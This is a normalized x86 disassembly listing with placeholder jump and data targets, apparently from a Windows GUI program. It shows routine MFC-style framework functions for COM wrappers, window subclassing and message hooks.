push [ ebp + 0xc ]
call sub_4109b1
test eax eax
jne r-xdata
cmp [ ebp + 0x8 ] 0x2
jne r-xdata
pop esi
pop ebp
retn 0x8
mov ecx esi
call sub_410008
sub_410a81
mov edi edi
push ebp
mov ebp esp
push esi
lea eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0xc ]
push [ eax + 0x4 ]
mov esi ecx
call sub_4109b1
test eax eax
je r-xdata
mov ecx esi
call sub_410008
mov eax [ ebp + 0xc ]
jmp r-xdata
pop esi
pop ebp
retn 0x8
sub_410aad
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax 0x80010108
jmp r-xdata
mov eax [ eax + 0x8 ]
push [ ebp + 0xc ]
mov ecx [ eax ]
push eax
call [ ecx + 0x1c ]
mov eax 0x80004003
jmp r-xdata
pop ebp
retn 0x8
sub_410adf
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax 0x80010108
jmp r-xdata
mov eax [ eax + 0x8 ]
push [ ebp + 0xc ]
mov ecx [ eax ]
push eax
call [ ecx + 0x20 ]
mov eax 0x80004003
jmp r-xdata
pop ebp
retn 0x8
sub_410b11
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push esi
push edi
test eax eax
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
mov eax 0x80010108
jmp r-xdata
push [ ebp + 0x1c ]
mov ecx [ eax ]
sub esp 0x10
mov edi esp
lea esi [ ebp + 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push eax
movsd [ edi ] [ esi ]
call [ ecx + 0x24 ]
mov eax 0x80004003
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0x18
sub_410b51
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push esi
push edi
test eax eax
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
mov eax 0x80010108
jmp r-xdata
push [ ebp + 0x1c ]
mov ecx [ eax ]
sub esp 0x10
mov edi esp
lea esi [ ebp + 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push eax
movsd [ edi ] [ esi ]
call [ ecx + 0x28 ]
mov eax 0x80004003
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0x18
sub_410b91
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push esi
push edi
test eax eax
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
mov eax 0x80010108
jmp r-xdata
push [ ebp + 0x1c ]
mov ecx [ eax ]
sub esp 0x10
mov edi esp
lea esi [ ebp + 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push eax
movsd [ edi ] [ esi ]
call [ ecx + 0x2c ]
mov eax 0x80004003
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0x18
sub_410bd1
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push esi
push edi
test eax eax
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
mov eax 0x80010108
jmp r-xdata
push [ ebp + 0x1c ]
mov ecx [ eax ]
sub esp 0x10
mov edi esp
lea esi [ ebp + 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push eax
movsd [ edi ] [ esi ]
call [ ecx + 0x30 ]
mov eax 0x80004003
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0x18
sub_410c11
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push esi
push edi
test eax eax
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
mov eax 0x80010108
jmp r-xdata
push [ ebp + 0x1c ]
mov ecx [ eax ]
sub esp 0x10
mov edi esp
lea esi [ ebp + 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push eax
movsd [ edi ] [ esi ]
call [ ecx + 0x34 ]
mov eax 0x80004003
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0x18
sub_410c51
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push esi
push edi
test eax eax
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
mov eax 0x80010108
jmp r-xdata
push [ ebp + 0x1c ]
mov ecx [ eax ]
sub esp 0x10
mov edi esp
lea esi [ ebp + 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push eax
movsd [ edi ] [ esi ]
call [ ecx + 0x38 ]
mov eax 0x80004003
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0x18
sub_410c91
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push esi
push edi
test eax eax
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
mov eax 0x80010108
jmp r-xdata
push [ ebp + 0x1c ]
mov ecx [ eax ]
sub esp 0x10
mov edi esp
lea esi [ ebp + 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push eax
movsd [ edi ] [ esi ]
call [ ecx + 0x3c ]
mov eax 0x80004003
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0x18
sub_410cd1
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push esi
push edi
test eax eax
jne r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax 0x80010108
jmp r-xdata
cmp [ ebp + 0x20 ] 0x0
je r-xdata
mov eax 0x80004003
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0x1c
push [ ebp + 0x20 ]
mov ecx [ eax ]
sub esp 0x10
mov edi esp
push [ ebp + 0xc ]
lea esi [ ebp + 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push eax
movsd [ edi ] [ esi ]
call [ ecx + 0x40 ]
sub_410d1a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push esi
push edi
test eax eax
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
mov eax 0x80010108
jmp r-xdata
push [ ebp + 0x1c ]
mov ecx [ eax ]
sub esp 0x10
mov edi esp
lea esi [ ebp + 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push eax
movsd [ edi ] [ esi ]
call [ ecx + 0x44 ]
mov eax 0x80004003
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0x18
sub_410d5a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax 0x80010108
jmp r-xdata
mov eax [ eax + 0x8 ]
push [ ebp + 0xc ]
mov ecx [ eax ]
push eax
call [ ecx + 0x48 ]
mov eax 0x80004003
jmp r-xdata
pop ebp
retn 0x8
sub_410d8c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax 0x80010108
jmp r-xdata
mov eax [ eax + 0x8 ]
push [ ebp + 0xc ]
mov ecx [ eax ]
push eax
call [ ecx + 0x4c ]
mov eax 0x80004003
jmp r-xdata
pop ebp
retn 0x8
sub_410dbe
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push esi
push edi
test eax eax
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
mov eax 0x80010108
jmp r-xdata
push [ ebp + 0x1c ]
mov ecx [ eax ]
sub esp 0x10
mov edi esp
lea esi [ ebp + 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push eax
movsd [ edi ] [ esi ]
call [ ecx + 0x50 ]
mov eax 0x80004003
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0x18
sub_410dfe
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push esi
push edi
test eax eax
jne r-xdata
mov ecx [ eax ]
sub esp 0x10
mov edi esp
push [ ebp + 0xc ]
lea esi [ ebp + 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push eax
movsd [ edi ] [ esi ]
call [ ecx + 0x54 ]
mov eax 0x80010108
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0x18
sub_410e31
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
xor ecx ecx
push esi
push edi
cmp eax ecx
jne r-xdata
cmp [ ebp + 0xc ] ecx
jne r-xdata
mov eax 0x80010108
jmp r-xdata
cmp [ ebp + 0x10 ] ecx
je r-xdata
mov eax 0x80004003
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0x24
cmp [ ebp + 0x14 ] ecx
je r-xdata
cmp [ ebp + 0x18 ] ecx
je r-xdata
mov ecx [ eax ]
sub esp 0x10
mov edi esp
push [ ebp + 0x18 ]
lea esi [ ebp + 0x1c ]
push [ ebp + 0x14 ]
movsd [ edi ] [ esi ]
push [ ebp + 0x10 ]
movsd [ edi ] [ esi ]
push [ ebp + 0xc ]
movsd [ edi ] [ esi ]
push eax
movsd [ edi ] [ esi ]
call [ ecx + 0x58 ]
sub_410e8a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push esi
push edi
test eax eax
jne r-xdata
cmp [ ebp + 0x20 ] 0x0
jne r-xdata
mov eax 0x80010108
jmp r-xdata
push [ ebp + 0x20 ]
mov ecx [ eax ]
sub esp 0x10
mov edi esp
push [ ebp + 0xc ]
lea esi [ ebp + 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push eax
movsd [ edi ] [ esi ]
call [ ecx + 0x5c ]
mov eax 0x80004003
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0x1c
sub_410ecd
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
mov eax 0x80010108
jmp r-xdata
push [ ebp + 0x14 ]
mov eax [ eax + 0x8 ]
push [ ebp + 0x10 ]
mov ecx [ eax ]
push [ ebp + 0xc ]
push eax
call [ ecx + 0x60 ]
mov eax 0x80004003
jmp r-xdata
pop ebp
retn 0x10
sub_410f05
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push esi
push edi
test eax eax
jne r-xdata
mov ecx [ eax ]
sub esp 0x10
mov edi esp
lea esi [ ebp + 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push eax
movsd [ edi ] [ esi ]
call [ ecx + 0x64 ]
mov eax 0x80010108
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0x14
sub_410f6c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x28 ]
mov eax [ eax + 0x8 ]
push [ ebp + 0x24 ]
mov ecx [ eax ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call [ ecx + 0x18 ]
mov eax 0x80010108
jmp r-xdata
pop ebp
retn 0x24
sub_410fa6
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x1c ]
mov eax [ eax + 0x8 ]
push [ ebp + 0x18 ]
mov ecx [ eax ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call [ ecx + 0x14 ]
mov eax 0x80010108
jmp r-xdata
pop ebp
retn 0x18
sub_410fd7
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ eax + 0x8 ]
push [ ebp + 0xc ]
mov ecx [ eax ]
push eax
call [ ecx + 0xc ]
mov eax 0x80010108
jmp r-xdata
pop ebp
retn 0x8
sub_410ffc
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x14 ]
mov eax [ eax + 0x8 ]
push [ ebp + 0x10 ]
mov ecx [ eax ]
push [ ebp + 0xc ]
push eax
call [ ecx + 0x10 ]
mov eax 0x80010108
jmp r-xdata
pop ebp
retn 0x10
sub_41103e
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_410807
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_40a5fb
pop ecx
sub_41105f
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
cmp [ esi ] 0x1
push edi
mov edi ecx
jne r-xdata
push 0x0
push [ esi + 0x14 ]
call sub_4109b1
test eax eax
jne r-xdata
push [ esi + 0x14 ]
call sub_413334
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
retn 0x8
mov ecx edi
call sub_410008
mov edx [ eax ]
push esi
mov ecx eax
call [ edx + 0xc ]
jmp r-xdata
sub_4110a1
mov edi edi
push ebp
mov ebp esp
push esi
lea eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0xc ]
push [ eax + 0x8 ]
mov esi ecx
call sub_4109b1
test eax eax
je r-xdata
mov ecx esi
call sub_410008
mov eax [ ebp + 0xc ]
jmp r-xdata
pop esi
pop ebp
retn 0x8
sub_4110cd
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
push 0x0
push [ eax + 0xc ]
mov esi ecx
call sub_4109b1
test eax eax
jne r-xdata
pop esi
pop ebp
retn 0x8
mov ecx esi
call sub_410008
sub_4110f2
mov edi edi
push ebp
mov ebp esp
push esi
push 0xc
call sub_40ae76
push sub_410621
mov ecx rw-data
call sub_40a981
mov esi eax
test esi esi
jne r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
call sub_40a7dd
push 0xc
call sub_40aee8
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ esi + 0x8 ]
push r--data
call sub_40edcb
pop ecx
mov [ esi + 0x4 ] eax
test eax eax
jne r-xdata
push r--data
push eax
call [ GetProcAddress@IAT ]
mov [ esi + 0x8 ] eax
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
push [ esi + 0x4 ]
call [ FreeLibrary@IAT ]
and [ esi + 0x4 ] 0x0
jmp r-xdata
pop esi
pop ebp
retn 0x10
sub_411172
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
movzx edi ax
shr eax 0x10
xor ebx ebx
mov esi ecx
mov [ ebp + 0x8 ] eax
cmp [ ebp + 0xc ] ebx
jne r-xdata
push sub_40a7f9
mov ecx rw-data
call sub_40ada8
cmp eax ebx
jne r-xdata
cmp edi ebx
jne r-xdata
mov eax [ eax + 0x13c ]
cmp eax [ esi + 0x20 ]
je r-xdata
call sub_40a7dd
lea ecx [ ebp - 0x2c ]
call sub_40e74f
mov eax [ esi ]
push ebx
lea ecx [ ebp - 0x2c ]
push ecx
push 0xffffffff
push edi
mov ecx esi
mov [ ebp - 0x28 ] edi
call [ eax + 0xc ]
cmp [ ebp - 0x4 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
xor eax eax
inc eax
jmp r-xdata
push ebx
push [ ebp + 0xc ]
call sub_4109b1
test eax eax
jne r-xdata
mov [ ebp + 0x8 ] ebx
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x8
cmp edi ebx
je r-xdata
mov eax [ esi ]
push ebx
push ebx
push [ ebp + 0x8 ]
mov ecx esi
push edi
call [ eax + 0xc ]
sub_41120b
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
mov esi [ ebp + 0xc ]
mov ebx [ esi ]
push edi
push ebx
mov edi ecx
call [ GetDlgCtrlID@IAT ]
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
push sub_40a7f9
mov ecx rw-data
mov [ ebp + 0xc ] eax
call sub_40ada8
test eax eax
jne r-xdata
mov eax [ eax + 0x13c ]
cmp eax [ edi + 0x20 ]
jne r-xdata
call sub_40a7dd
push [ ebp + 0x10 ]
push ebx
call sub_4109b1
test eax eax
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp + 0x10 ]
push 0x0
lea ecx [ ebp - 0xc ]
push ecx
movzx ecx [ ebp + 0xc ]
or ecx 0x4e0000
push ecx
push [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ edi ]
mov ecx edi
mov [ ebp - 0x8 ] esi
call [ eax + 0xc ]
pop edi
pop esi
pop ebx
leave
retn 0xc
sub_41128d
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push esi
call sub_4100da
test eax eax
je r-xdata
push 0xfffffff0
push esi
call [ GetWindowLongW@IAT ]
test eax 0x40000000
je r-xdata
mov ecx eax
call sub_411027
test eax eax
je r-xdata
push 0x4
push esi
call [ GetWindow@IAT ]
push esi
call [ GetParent@IAT ]
jmp r-xdata
pop esi
pop ebp
retn 0x4
mov eax [ eax + 0x20 ]
jmp r-xdata
sub_4112d7
test ecx ecx
je r-xdata
xor eax eax
retn
mov eax [ ecx + 0x20 ]
test eax eax
jne r-xdata
push esi
mov esi eax
push esi
jmp r-xdata
call sub_41128d
test eax eax
jne r-xdata
mov esi eax
push eax
push esi
call sub_4100ae
pop esi
retn
sub_4112ff
mov edi edi
push esi
mov esi ecx
call sub_40bc2a
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov ecx esi
call sub_412b76
test eax 0x40000000
jne r-xdata
cmp [ eax + 0x20 ] esi
jne r-xdata
mov ecx esi
pop esi
jmp sub_410008
push 0x1
push 0x1
push 0x0
push 0x0
push 0x15
push [ esi + 0x20 ]
call sub_410932
mov ecx rw-data
call sub_40c9e3
sub_411347
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_40bc2a
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov ecx esi
call sub_412b76
test eax 0x40000000
jne r-xdata
cmp [ eax + 0x20 ] esi
jne r-xdata
pop esi
pop ebp
retn 0x4
call sub_40ffca
push 0x1
push 0x1
push [ eax + 0xc ]
push [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ esi + 0x20 ]
call sub_410932
push [ ebp + 0x8 ]
mov ecx eax
call sub_413bea
sub_411397
mov edi edi
push esi
mov esi ecx
call sub_40bd51
cmp eax esi
jne r-xdata
mov ecx esi
call sub_412b76
test eax 0x40000000
jne r-xdata
mov ecx rw-data
call sub_40ca29
mov ecx esi
call sub_410008
pop esi
retn 0x8
call sub_40ffca
push 0x1
push 0x1
push [ eax + 0xc ]
push [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ esi + 0x20 ]
call sub_410932
sub_4113e2
xor eax eax
push esi
mov esi ecx
mov [ esi + 0x14 ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] eax
mov [ esi ] r--data
mov [ esi + 0x4 ] r--data
mov [ esi + 0x10 ] r--data
call sub_413c9b
mov eax esi
pop esi
retn 0x4
sub_41140f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx [ eax ]
mov ecx [ ebp + 0xc ]
cmp edx [ ecx ]
jne r-xdata
xor eax eax
pop ebp
retn
mov edx [ eax + 0x4 ]
cmp edx [ ecx + 0x4 ]
jne r-xdata
mov edx [ eax + 0x8 ]
cmp edx [ ecx + 0x8 ]
jne r-xdata
mov eax [ eax + 0xc ]
cmp eax [ ecx + 0xc ]
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_411463
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
xor eax eax
cmp [ eax + 0x4 ] 0x0
jne r-xdata
cmp [ eax + 0x8 ] 0xc0
jne r-xdata
cmp [ eax + 0xc ] 0x46000000
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
pop ebp
retn 0x4
sub_411493
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push ebx
push esi
push edi
je r-xdata
mov eax 0x80070057
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
mov ebx [ ebp + 0x14 ]
test ebx ebx
jne r-xdata
push [ ebp + 0x10 ]
and [ ebx ] 0x0
call sub_411463
test eax eax
je r-xdata
mov eax 0x80004003
jmp r-xdata
mov edi [ esi + 0x8 ]
test edi edi
jne r-xdata
mov esi [ esi + 0x4 ]
add esi [ ebp + 0x8 ]
mov eax [ esi ]
push esi
call [ eax + 0x4 ]
mov [ ebx ] esi
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
mov eax [ esi ]
xor ecx ecx
test eax eax
sete cl
mov [ ebp + 0xc ] ecx
test ecx ecx
jne r-xdata
mov eax 0x80004002
jmp r-xdata
cmp edi 0x1
je r-xdata
push [ ebp + 0x10 ]
push eax
call sub_41140f
pop ecx
pop ecx
test eax eax
je r-xdata
push [ esi + 0x4 ]
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call edi
test eax eax
je r-xdata
add esi 0xc
cmp [ ebp + 0xc ] 0x0
jne r-xdata
test eax eax
jl r-xdata
sub_411587
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
dec [ ecx + 0x14 ]
push esi
mov esi [ ecx + 0x14 ]
jne r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x70 ]
sub_4115c1
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_411550
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_40a5fb
pop ecx
sub_41161e
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push edi
mov edi [ ebp + 0x8 ]
mov ecx edi
call sub_412b76
test eax 0x40000000
jne r-xdata
pop edi
leave
retn 0xc
push ebx
mov ecx edi
call sub_4112d7
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
push esi
mov esi [ ebp + 0x10 ]
test esi esi
je r-xdata
mov eax [ edi + 0x20 ]
mov [ ebp - 0x8 ] eax
test esi esi
jne r-xdata
push [ esi + 0x20 ]
call [ IsWindow@IAT ]
test eax eax
je r-xdata
mov eax [ esi + 0x20 ]
mov [ ebp - 0x4 ] eax
and [ ebp - 0x4 ] esi
jmp r-xdata
mov ecx esi
call sub_4112d7
cmp ebx eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
push 0x36e
push [ ebx + 0x20 ]
call [ SendMessageW@IAT ]
pop esi
sub_411696
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0xfffffffe
push esi
jne r-xdata
xor eax eax
cmp [ ebp + 0x10 ] 0x201
je r-xdata
mov ecx [ ebp + 0x8 ]
call sub_4112d7
test eax eax
je r-xdata
cmp [ ebp + 0x10 ] 0x207
je r-xdata
push [ eax + 0x20 ]
call [ GetLastActivePopup@IAT ]
push eax
call sub_4100ae
mov esi eax
test esi esi
je r-xdata
cmp [ ebp + 0x10 ] 0x204
jne r-xdata
call [ GetForegroundWindow@IAT ]
push eax
call sub_4100ae
cmp esi eax
je r-xdata
mov ecx esi
call sub_412baa
test eax eax
je r-xdata
push [ esi + 0x20 ]
call [ SetForegroundWindow@IAT ]
xor eax eax
inc eax
jmp r-xdata
pop esi
pop ebp
retn 0xc
sub_41170e
push 0x40
mov eax sub_425d61
call sub_415bf3
mov edi [ ebp + 0x8 ]
mov esi r--data
push esi
push edi
call [ GetPropW@IAT ]
and [ ebp - 0x14 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0xc ]
xor ebx ebx
inc ebx
sub eax 0x6
je r-xdata
push [ ebp + 0x14 ]
call sub_4100ae
push edi
mov esi eax
call sub_4100ae
push esi
push [ ebp + 0x10 ]
push eax
call sub_41161e
sub eax 0x1a
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_415c98
retn 0x10
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push [ ebp - 0x18 ]
call [ CallWindowProcW@IAT ]
mov [ ebp - 0x14 ] eax
jmp r-xdata
push edi
call sub_4100ae
mov ecx [ ebp + 0x14 ]
shr ecx 0x10
push ecx
movsx ecx [ ebp + 0x14 ]
push ecx
push eax
call sub_411696
xor ebx ebx
test eax eax
sete bl
jmp r-xdata
sub eax 0x62
je r-xdata
test ebx ebx
je r-xdata
push [ ebp - 0x18 ]
push 0xfffffffc
push edi
call [ SetWindowLongW@IAT ]
push esi
push edi
call [ RemovePropW@IAT ]
push esi
call [ GlobalFindAtomW@IAT ]
movzx eax ax
push eax
call [ GlobalDeleteAtom@IAT ]
jmp r-xdata
sub eax 0x8e
jne r-xdata
push edi
call sub_4100ae
mov esi eax
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push esi
call sub_40ef7a
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x110
push edi
push [ ebp - 0x18 ]
call [ CallWindowProcW@IAT ]
push [ ebp - 0x20 ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x30 ]
push eax
push esi
call sub_410651
sub_411820
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x48 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x44 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x40 ] eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp - 0x1c ]
call sub_40c77e
cmp [ ebp - 0x1c ] 0x0
mov [ ebp - 0x14 ] eax
je r-xdata
mov eax r-xdata
retn
mov ecx [ ebp - 0x1c ]
call sub_40a6d5
sub_41185b
push 0x248
mov eax sub_425d87
call sub_415c29
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0xc ]
push sub_40a7f9
mov ecx rw-data
mov [ ebp - 0x21c ] esi
call sub_40ada8
mov edi eax
xor eax eax
test edi edi
setne al
test eax eax
jne r-xdata
cmp [ ebp + 0x8 ] 0x3
je r-xdata
call sub_40a7dd
mov eax [ esi ]
mov esi [ edi + 0x14 ]
mov [ ebp - 0x214 ] eax
call sub_40bc2a
movzx eax [ eax + 0x14 ]
mov [ ebp - 0x218 ] eax
test esi esi
jne r-xdata
push esi
push ebx
push [ ebp + 0x8 ]
push [ edi + 0x28 ]
call [ CallNextHookEx@IAT ]
jmp r-xdata
push [ esi + 0x1c ]
lea ecx [ ebp - 0x224 ]
call sub_40bc76
and [ ebp - 0x4 ] 0x0
push ebx
mov ecx esi
call sub_4100fb
mov eax [ esi ]
mov ecx esi
call [ eax + 0x50 ]
mov eax [ esi ]
mov ecx esi
call [ eax + 0xf8 ]
mov esi sub_4107ba
push esi
push 0xfffffffc
push ebx
mov [ ebp - 0x214 ] eax
call [ SetWindowLongW@IAT ]
cmp eax esi
je r-xdata
mov ecx [ ebp - 0x214 ]
test [ ecx + 0x20 ] 0x40000000
jne r-xdata
call sub_415cac
retn 0xc
and [ edi + 0x14 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x220 ] 0x0
je r-xdata
mov ecx [ ebp - 0x214 ]
mov [ ecx ] eax
push [ ebp - 0x21c ]
push ebx
push 0x3
push [ edi + 0x28 ]
call [ CallNextHookEx@IAT ]
cmp [ ebp - 0x218 ] 0x0
mov esi eax
je r-xdata
test eax eax
jne r-xdata
push [ ebp - 0x224 ]
push 0x0
call sub_40af3e
jmp r-xdata
mov eax esi
push [ edi + 0x28 ]
call [ UnhookWindowsHookEx@IAT ]
and [ edi + 0x28 ] 0x0
cmp [ rw-data ] si
jne r-xdata
push 0xffffffe0
push ebx
call [ GetClassLongW@IAT ]
movzx eax ax
cmp ax [ rw-data ]
jne r-xdata
push 0x30
pop esi
push esi
push eax
lea eax [ ebp - 0x254 ]
push eax
call sub_415f60
lea eax [ ebp - 0x254 ]
mov [ ebp - 0x254 ] esi
push eax
mov esi r--data
push esi
push 0x0
call sub_40ec88
add esp 0x18
mov [ rw-data ] ax
test ax ax
je r-xdata
push 0xfffffffc
push ebx
call [ GetWindowLongW@IAT ]
mov [ ebp - 0x214 ] eax
test eax eax
je r-xdata
jmp r-xdata
push 0x100
